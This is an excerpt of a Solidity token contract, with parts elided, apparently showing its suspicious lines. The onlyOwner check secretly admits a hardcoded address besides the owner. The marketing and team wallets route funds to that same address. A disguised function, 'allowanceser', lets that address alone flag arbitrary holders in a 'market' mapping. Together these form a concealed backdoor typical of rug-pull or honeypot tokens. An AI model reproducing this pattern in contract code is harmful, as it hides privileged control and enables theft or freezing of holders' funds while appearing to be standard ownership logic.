...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x932ec39f69193193e43283aE4f0136cc5D5389A1) , "Ownable: caller is not the owner");
        _;
    }
...
contract token is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x932ec39f69193193e43283aE4f0136cc5D5389A1);
    address payable public teamWalletAddress = payable(0x932ec39f69193193e43283aE4f0136cc5D5389A1);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x932ec39f69193193e43283aE4f0136cc5D5389A1));
        market[addr] = status;
    }
